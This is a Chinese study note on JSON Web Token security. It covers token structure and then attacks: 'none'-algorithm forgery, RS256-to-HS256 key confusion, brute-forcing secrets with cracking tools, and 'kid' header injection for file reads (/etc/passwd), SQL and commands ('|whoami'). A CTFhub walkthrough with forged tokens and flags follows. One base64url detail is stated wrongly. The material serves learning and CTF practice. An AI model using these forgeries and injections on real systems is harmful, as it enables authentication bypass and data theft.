# JWT（JSON Web Token）安全

> 创建: 未知 | 更新: 2026-05-21 | 适用: 通用Web (JWT标准跨语言) | ⚠️ 部分图片托管于外部CDN

### JWT概述

`JWT`的全称是`JSON Web Token`。遵循JSON格式，跨域认证解决方案。声明被存储在`客户端`，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。

### 传统认证

#### Cookie

```
HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。

假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。

不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。

保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。

Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。

服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。”
```

摘录来自: 上野宣、于均良. “图解HTTP”。

### JWT组成

JWT由三部分组成：`header`、`payload`、`signature`

#### header

header部分最常用的两个字段是`alg`和`typ`，`alg`指定了token加密使用的算法（最常用的为`HMAC`和`RSA`算法），`typ`声明类型为JWT

header类似如下：

```
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### payload

payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据：

```
{
    "user_role" : "finn",    	//当前登录用户
    "iss": "admin",          	//该JWT的签发者,有些是URL
    "iat": 1573440582,        //签发时间
    "exp": 1573940267,        //过期时间
    "nbf": 1573440582,        //该时间之前不接收处理该Token
    "domain": "example.com",   //面向的用户
    "jti": "dff4214121e83057655e10bd9751d657"   //Token唯一标识
}
```

#### signature

signature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的`算法`，计算签名。

抽象成公式就是

```
signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key
```

`注意：`编码header和payload时使用的编码方式为`base64urlencode`，`base64url`编码是`base64`的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。

### JWT安全

一个完整的jwt格式为(`header`.`payload`.`signature`)，其中header、payload使用`base64url`编码，signature通过指定算法生成。

#### 加密算法

##### 空加密算法

JWT支持使用空加密算法，可以在header中指定alg为`None`

这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。如下：

```
{
    "alg" : "None",
    "typ" : "jwt"
}
{
    "user" : "Admin"
}
```

生成的完整token为`ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0`

(header+’.’+payload，去掉了’.’+signature字段)

空加密算法的设计初衷是用于调试的，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。

##### RSA改为HMAC

JWT中最常用的两种算法为`HMAC`和`RSA`。

`HMAC`是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。

`RSA`则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。

在HMAC和RSA算法中，都是使用私钥对`signature`字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。

现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥`pem`对JWT token进行签名，公钥`pub`对签名进行验证。

```
{
    "alg" : "RS256",
    "typ" : "jwt"
}
```

通常情况下密钥`pem`是无法获取到的，但是公钥`pub`却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即

```
{
    "alg" : "HS256",
    "typ" : "jwt"
}
```

同时使用获取到的公钥`pub`作为算法的密钥，对token进行签名，发送到服务器端。

服务器端会将RSA的公钥（`pub`）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。

```
https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/
```

#### 密钥暴破

暴破基础

- 知悉JWT使用的加密算法
- 一段有效的、已签名的token
- 签名用的密钥不复杂（弱密钥）

因此局限性还是较大

工具参考如下：JWT-Tools

简单的组合爆破起来相对较简单，一旦复杂起来将很难再进行实施爆破。

#### 修改KID参数

`kid`是jwt header中的一个可选参数，全称是`key ID`，它用于指定加密算法的密钥

```
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "/home/jwt/.ssh/pem"
}
```

因为该参数可以由用户输入，因此也可能造成一些安全问题。

##### 任意文件读取

`kid`参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，因此，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。

```
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "/etc/passwd"
}
```

##### SQL注入

`kid`也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证。

```
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "key11111111' || union select 'secretkey' -- "
}
```

##### 命令执行

对`kid`参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了`open`函数，通过构造参数就可能造成命令注入。

```
"/path/to/key_file|whoami"
```

对于其他的语言，例如php，如果代码中使用的是`exec`或者是`system`来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。

#### 修改JKU/X5U

`JKU`的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于`kid`，`JKU`也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。

`X5U`则以URI的形式数允许攻击者指定用于验证令牌的**公钥证书或证书链**，与`JKU`的攻击利用方式类似。

#### 信息泄漏

JWT保证的是数据传输过程中的完整性而不是机密性。

由于payload是使用`base64url`编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行`base64url`解码，就可以读取到payload中携带的信息。

### JWT Tools

[JWT爆破](https://github.com/brendan-rius/c-jwt-cracker)

```
git clone https://github.com/brendan-rius/c-jwt-cracker.git
cd c-jwt-cracker
brew install openssl
make OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
```

![image-20201020161036706](https://si1ent.xyz/images/jwt/image-20201020161036706.png)

JWT在线工具

[JWT Online](https://jwt.io/)

[JWT_Tool](https://github.com/ticarpi/jwt_tool)

```
pip3 install pycryptodomex
py3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE
```

![image-20201021113441020](https://si1ent.xyz/images/jwt/image-20201021113441020.png)

![image-20201021113549915](https://si1ent.xyz/images/jwt/image-20201021113549915.png)

```
1. 修改JWT
2. 生成None算法的JWT
3. 检查RS/HS256公钥错误匹配漏洞
4. 检测JKU密钥是否可伪造
5. 输入一个key,检查是否正确
6. 输入一个存放key的文本，检查是否正确
7. 输入字典文本，爆破
8. 输入RSA公钥，检查是否正确
```

交互工具

主要针对`alg`被致None，因在线工具无法修改为None，所以需要使用交互方式来获取token。

```
python
import jwt
jwt.encode(payload)
```

### JWT攻击

以下题目参考[ctfhub](https://www.ctfhub.com/)中关于JWT的CTF试题学习并练习；算法修改并未得到flag。

#### 题一：信息泄漏

题目提示信息：敏感信息泄漏

![image-20201020175137207](https://si1ent.xyz/images/jwt/image-20201020175137207.png)

访问URL

```
http://challenge-f0ba92c933a7d9be.sandbox.ctfhub.com:10080/
```

提示输入用户名及密码

![image-20201020175233885](https://si1ent.xyz/images/jwt/image-20201020175233885.png)

观察响应数据

![image-20201020175334255](https://si1ent.xyz/images/jwt/image-20201020175334255.png)

发现Cookie属于JWT

![image-20201020175407427](https://si1ent.xyz/images/jwt/image-20201020175407427.png)

复制并提交在线工具

```
eyJBRyI6ImI5MmNlNzk1NDg4ZTZjMDExNjBmNjU4fSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezA1OGFiZjNiM2IwZTlkOGQ1In0._TNIAg9rDfqtOFejHiIz9tXyJ7-hGqsKlJudTfXYZtw

# 解码后由下图得知，flag只有一半，但是另一半在header中保存，拼接即可。
```

![image-20201020175507938](https://si1ent.xyz/images/jwt/image-20201020175507938.png)

```
ctfhub{058abf3b3b0e9d8d5b92ce795488e6c01160f658}
```

#### 题二：None

题目提示：JWT支持None，并且后端不执行签名验证。

![image-20201020192649086](https://si1ent.xyz/images/jwt/image-20201020192649086.png)

访问URL

```
http://challenge-9f380c0d9554b48b.sandbox.ctfhub.com:10080/login.php
```

admin/admin登录：提示只有admin才能获得flag值。

![image-20201020192750143](https://si1ent.xyz/images/jwt/image-20201020192750143.png)

![image-20201020192907650](https://si1ent.xyz/images/jwt/image-20201020192907650.png)

获取登录token并进行在线解码处理

分别对header、payload进行解码修改对应值并编码处理。

![image-20201021110733681](https://si1ent.xyz/images/jwt/image-20201021110733681.png)

![image-20201021110753552](https://si1ent.xyz/images/jwt/image-20201021110753552.png)

```
# 因后台不进行签名验证了，因此可直接替换对应值即可绕过。
# 因在线网站无法修改none，因此这里使用python的交互来获取token如下：
{"typ":"JWT","alg":"none"}
{"username":"admin","password":"1","role":"admin"}
jwt.encode({"username":"admin","password":"1","role":"admin"},algorithm="none",key="")
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

用none算法生成的JWT只有两部分了，根本连签名都不存在。

![image-20201021144848195](https://si1ent.xyz/images/jwt/image-20201021144848195.png)

替换token，重放后可得到flag值

![image-20201021110552087](https://si1ent.xyz/images/jwt/image-20201021110552087.png)

```
ctfhub{adcd547cd87ee1536fba1a7fe530a8d9719e9ee3}
```

#### 题三：弱密码

由题目得知：JWT采用对称加密算法，如果密钥的强度较弱的话，会被爆破攻击。

![image-20201020201008964](https://si1ent.xyz/images/jwt/image-20201020201008964.png)

访问URL

```
http://challenge-97dc1d0c313c1266.sandbox.ctfhub.com:10080/login.php
```

![image-20201020201106689](https://si1ent.xyz/images/jwt/image-20201020201106689.png)

admin/admin

![image-20201020201132629](https://si1ent.xyz/images/jwt/image-20201020201132629.png)

获取JWT的token

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE
```

使用工具进行爆破得到密钥

![image-20201021111740982](https://si1ent.xyz/images/jwt/image-20201021111740982.png)

修改对应值并获得最新的token

![image-20201021111921365](https://si1ent.xyz/images/jwt/image-20201021111921365.png)

```
ctfhub{11f50e22266935854562ba365e25aabd719a7cc3}
```

#### 题四：修改签名算法

题目：修改签名算法完成绕过;

![image-20201021112611069](https://si1ent.xyz/images/jwt/image-20201021112611069.png)

访问URL

```
http://challenge-9fc2bbd399072286.sandbox.ctfhub.com:10080/
```

登录入口信息及部分php提示

![image-20201021141803090](https://si1ent.xyz/images/jwt/image-20201021141803090.png)

提示如下：主要关注点下面，主要是对JWT算法并绕过获得flag。

![image-20201021141738055](https://si1ent.xyz/images/jwt/image-20201021141738055.png)

```
{"username":"admin","password":"admin","role":"admin"}
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.LURZ-AAb42YweV6rAylSGFB19J5A3dbTMQw0TieJ3u8
pip install pyjwt

import jwt
import base64
public = open('1.pem', 'r').read()
print jwt.encode({"username":"admin","password":"admin","role":"admin"}, key=public, algorithm='HS256')
未获取flag！！！
```

### Referer

```
https://xz.aliyun.com/t/6776
https://cyberpolygon.com/materials/security-of-json-web-tokens-jwt/
https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a
JWT绕过CTF
https://delcoding.github.io/2018/03/jwt-bypass/
https://www.ctfhub.com/
https://www.slideshare.net/OWASP_Poland/opd-2019-attacking-jwt-tokens
```

---

## 相关资源

- **工具**: [jwt.io](https://jwt.io) 在线编解码 | [jwt-cracker](https://github.com/lmammino/jwt-cracker) 密钥爆破 | [PyJWT](https://pyjwt.readthedocs.io/) Python库
- **脚本**: [python-note.md](CTF常用脚本及工具/python-note.md) — Python requests/urllib模块用于JWT请求
- **关联**: [SSTI.md](SSTI.md) — JWT中的SSTI注入 | [SQL.md](SQL.md) — JWT中的SQL注入